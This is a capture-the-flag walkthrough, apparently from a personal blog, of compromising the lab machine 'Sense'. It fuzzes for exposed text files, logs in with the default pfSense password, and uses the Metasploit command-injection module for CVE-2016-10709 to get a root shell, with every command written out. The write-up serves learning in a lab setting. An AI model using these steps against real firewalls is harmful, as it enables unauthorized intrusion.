# sense

## Summary:

- Fuzz for config files, specifically txt files; found credentials
- Found version of pfsense to find command injection vulnerability in a PHP page on pfSense via a GET parameter
- Used metasploit exploit to get root shell

First enumerate the ports and services:

```bash
sudo nmap -sC -sV 10.10.10.60 -oN nmap/sense

PORT    STATE SERVICE  VERSION
80/tcp  open  http     lighttpd 1.4.35
|_http-title: Did not follow redirect to https://10.10.10.60/
|_http-server-header: lighttpd/1.4.35
443/tcp open  ssl/http lighttpd 1.4.35
| ssl-cert: Subject: commonName=Common Name (eg, YOUR name)/organizationName=CompanyName/stateOrProvinceName=Somewhere/countryName=US
| Not valid before: 2017-10-14T19:21:35
|_Not valid after:  2023-04-06T19:21:35
|_http-title: Login
|_ssl-date: TLS randomness does not represent time
|_http-server-header: lighttpd/1.4.35

rustscan -a 10.10.10.60 
```

There’s an http and https server. The version also seems unique; 1.4.35 lighttpd

Searching up the version reveals two vulnerabilities, an sql injection and a path traversal. Let’s keep that in mind and visit the site:

![image.png]({{ site.baseurl }}/assets/sense/image.png)

It’s a pfsense software, judging from the Title. Let’s try default password:

```bash
admin:admin
admin:pfsense
```

Let’s download the exploit we found here by searching lighttpd 1.4.35 exploit https://github.com/sp4c30x1/uc_httpd_exploit?tab=readme-ov-file

The script appends ../ after the target IP

```bash
python3 vltz.py https://10.10.10.60 /etc/passwd
```

Did not work.

Let’s fuzz:

```bash
feroxbuster -u https://10.10.10.60 -k

ffuf -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt:FUZZ -u https://10.10.10.60/FUZZ -ic -e .txt

themes                  [Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 37ms]
css                     [Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 21ms]
includes                [Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 20ms]
javascript              [Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 21ms]
changelog.txt           [Status: 200, Size: 271, Words: 35, Lines: 10, Duration: 26ms]
classes                 [Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 25ms]
widgets                 [Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 26ms]
tree                    [Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 22ms]
shortcuts               [Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 24ms]
installer               [Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 25ms]
wizards                 [Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 19ms]
                        [Status: 200, Size: 6690, Words: 907, Lines: 174, Duration: 95ms]
csrf                    [Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 27ms]
system-users.txt        [Status: 200, Size: 106, Words: 9, Lines: 7, Duration: 34ms]
```

changelog.txt:

```bash
# Security Changelog 

### Issue
There was a failure in updating the firewall. Manual patching is therefore required

### Mitigated
2 of 3 vulnerabilities have been patched.

### Timeline
The remaining patches will be installed during the next maintenance window
```

system-users.txt:

```bash
####Support ticket###

Please create the following user

username: Rohit
password: company defaults
```

Let’s try to log in with the obtained credential:

```bash
#The above did not work, maybe the password is default pfsense password?
rohit:pfsense
```

We are in.

![image.png]({{ site.baseurl }}/assets/sense/image%201.png)

We see that the copyright goes up to 2014, so it is probably a 2014 version. Also it says on top 2.1.3_RELEASE. Searching pfsense 2014 exploit reveal metasploit exploits are available. Let’s check:

```bash
msfconsole
search pfsense

exploit/unix/http/pfsense_group_member_exec     2017-11-06       excellent  Yes    pfSense authenticated group member RCE

use 7
set RHOSTS 10.10.10.60
set LHOST tun0
set USERNAME rohit
```

Did not work. Let’s try another:

CVE-2016-10709

command injection vulnerability in a PHP page on pfSense via a GET parameter

```bash
exploit/unix/http/pfsense_graph_injection_exec  2016-04-18       excellent  No     pfSense authenticated graph status RCE

use 6
set RHOSTS 10.10.10.60
set LHOST tun0
set USERNAME rohit

```

Success. We are in.

```bash
shell
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

![image.png]({{ site.baseurl }}/assets/sense/image%202.png)

Seems like we are root…